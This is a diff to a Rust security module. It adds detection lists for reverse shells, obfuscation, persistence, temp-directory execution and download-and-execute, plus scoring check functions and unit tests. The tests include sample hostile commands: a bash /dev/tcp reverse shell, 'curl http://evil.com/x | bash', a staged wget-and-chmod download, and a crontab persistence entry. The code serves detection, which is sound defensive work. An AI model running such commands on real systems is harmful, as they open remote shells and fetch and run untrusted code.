@@ -147,6 +147,88 @@ pub const SUPPLY_CHAIN_IOCS: &[&str] = &[
     "reverse_shell",
 ];
 
+// ── Extended patterns (migrated from dashboard analyze_command) ──────────
+
+/// Reverse shell indicators (score 60).
+pub const REVERSE_SHELL_INDICATORS: &[&str] = &[
+    "/dev/tcp/",
+    "/dev/udp/",
+    "nc -e",
+    "ncat -e",
+    "netcat -e",
+    "bash -i",
+    "socat exec:",
+    "socat tcp",
+    "socat udp",
+    "0>&1",
+    ">&/dev/tcp",
+    "socket.socket",
+    "pty.spawn",
+    "use socket",
+    "perl -mio",
+    "fsockopen",
+    "-rsocket",
+    "mkfifo /tmp/",
+];
+
+/// Obfuscation patterns (score 30).
+pub const OBFUSCATION_INDICATORS: &[&str] = &[
+    "base64 -d",
+    "base64 --decode",
+    "openssl enc -d",
+    "| xxd -r",
+    "eval $(echo",
+    "eval \"$(echo",
+    "eval `echo",
+    "eval $(base64",
+    "eval $(printf",
+    "| rev |",
+    "printf '\\x",
+    "printf \"\\x",
+    "echo -e '\\x",
+    "echo -e \"\\x",
+    "echo -ne '\\x",
+    "$'\\x",
+    "python -c \"import os",
+    "python3 -c \"import os",
+    "python -c 'import os",
+    "python3 -c 'import os",
+    "python -c \"import subprocess",
+    "python3 -c \"import subprocess",
+    "perl -e 'system",
+    "perl -e 'exec",
+    "ruby -e 'system",
+    "ruby -e '`",
+];
+
+/// Persistence indicators (score 20).
+pub const PERSISTENCE_INDICATORS: &[&str] = &[
+    "crontab",
+    "/etc/cron",
+    ".bashrc",
+    ".bash_profile",
+    ".profile",
+    "/etc/profile",
+    "/etc/rc.local",
+    "systemctl enable",
+    "update-rc.d",
+    "chkconfig",
+    ".config/autostart",
+];
+
+/// Temp directory execution indicators (score 30).
+pub const TMP_EXECUTION_DIRS: &[&str] = &["/tmp/", "/var/tmp/", "/dev/shm/", "/run/shm/"];
+
+/// Downloaders for download-and-execute detection.
+pub const DOWNLOADERS: &[&str] = &["curl", "wget", "fetch", "http"];
+
+/// Shell executors for download-and-execute detection.
+pub const EXECUTORS: &[&str] = &[
+    "sh", "bash", "zsh", "dash", "python", "perl", "ruby", "node",
+];
+
+// ── Check functions ─────────────────────────────────────────────────────
+
 /// Check content for injection patterns. Returns first match.
 pub fn check_injection(content: &str) -> Option<&'static str> {
     let lower = content.to_lowercase();
@@ -188,6 +270,79 @@ pub fn check_sensitive_path(content: &str) -> Option<&'static str> {
         .copied()
 }
 
+/// Check for reverse shell indicators. Returns (indicator, score).
+pub fn check_reverse_shell(content: &str) -> Option<(&'static str, u32)> {
+    let lower = content.to_ascii_lowercase();
+    REVERSE_SHELL_INDICATORS
+        .iter()
+        .find(|i| lower.contains(*i))
+        .map(|i| (*i, 60))
+}
+
+/// Check for obfuscation patterns. Returns (indicator, score).
+pub fn check_obfuscation(content: &str) -> Option<(&'static str, u32)> {
+    let lower = content.to_ascii_lowercase();
+    OBFUSCATION_INDICATORS
+        .iter()
+        .find(|i| lower.contains(*i))
+        .map(|i| (*i, 30))
+}
+
+/// Check for persistence attempts. Returns (indicator, score).
+pub fn check_persistence(content: &str) -> Option<(&'static str, u32)> {
+    let lower = content.to_ascii_lowercase();
+    PERSISTENCE_INDICATORS
+        .iter()
+        .find(|i| lower.contains(*i))
+        .map(|i| (*i, 20))
+}
+
+/// Check for temp directory execution. Returns (dir, score).
+pub fn check_tmp_execution(content: &str) -> Option<(&'static str, u32)> {
+    let lower = content.to_ascii_lowercase();
+    TMP_EXECUTION_DIRS
+        .iter()
+        .find(|d| lower.contains(*d))
+        .map(|d| (*d, 30))
+}
+
+/// Check for download-and-execute via pipe. Returns score.
+pub fn check_download_execute_pipe(content: &str) -> Option<u32> {
+    if !content.contains('|') {
+        return None;
+    }
+    let parts: Vec<&str> = content.split('|').collect();
+    if parts.len() < 2 {
+        return None;
+    }
+    let left = parts[0].to_ascii_lowercase();
+    let right = parts[1..].join("|").to_ascii_lowercase();
+    let has_downloader = DOWNLOADERS.iter().any(|d| left.contains(d));
+    let has_executor = EXECUTORS.iter().any(|e| {
+        right
+            .split_whitespace()
+            .any(|w| w.trim_start_matches("./") == *e)
+    });
+    if has_downloader && has_executor {
+        Some(40)
+    } else {
+        None
+    }
+}
+
+/// Check for download-and-execute via staged chmod. Returns score.
+pub fn check_download_execute_staged(content: &str) -> Option<u32> {
+    let lower = content.to_ascii_lowercase();
+    let has_download = DOWNLOADERS.iter().any(|d| lower.contains(d));
+    let has_chmod_exec =
+        lower.contains("chmod +x") || lower.contains("chmod 755") || lower.contains("chmod 777");
+    if has_download && has_chmod_exec {
+        Some(40)
+    } else {
+        None
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -215,5 +370,50 @@ mod tests {
     fn detects_sensitive_paths() {
         assert!(check_sensitive_path("/home/user/.ssh/id_rsa").is_some());
         assert!(check_sensitive_path("/tmp/output.txt").is_none());
+    }
+
+    #[test]
+    fn detects_reverse_shell() {
+        let (indicator, score) = check_reverse_shell("bash -i >& /dev/tcp/1.2.3.4/4444").unwrap();
+        assert_eq!(indicator, "/dev/tcp/");
+        assert_eq!(score, 60);
+        assert!(check_reverse_shell("echo hello").is_none());
+    }
+
+    #[test]
+    fn detects_obfuscation() {
+        let (indicator, score) = check_obfuscation("echo payload | base64 -d | sh").unwrap();
+        assert_eq!(indicator, "base64 -d");
+        assert_eq!(score, 30);
+        assert!(check_obfuscation("echo hello").is_none());
+    }
+
+    #[test]
+    fn detects_persistence() {
+        let (indicator, score) = check_persistence("echo '* * * * * /tmp/rev' | crontab -").unwrap();
+        assert_eq!(indicator, "crontab");
+        assert_eq!(score, 20);
+    }
+
+    #[test]
+    fn detects_tmp_execution() {
+        let (dir, score) = check_tmp_execution("wget -O /tmp/payload && chmod +x /tmp/payload").unwrap();
+        assert_eq!(dir, "/tmp/");
+        assert_eq!(score, 30);
+    }
+
+    #[test]
+    fn detects_download_pipe() {
+        assert_eq!(check_download_execute_pipe("curl http://evil.com/x | bash"), Some(40));
+        assert!(check_download_execute_pipe("echo hello").is_none());
+    }
+
+    #[test]
+    fn detects_staged_download() {
+        assert_eq!(
+            check_download_execute_staged("wget http://evil.com/x -O /tmp/x && chmod +x /tmp/x"),
+            Some(40)
+        );
+        assert!(check_download_execute_staged("ls -la").is_none());
     }
 }
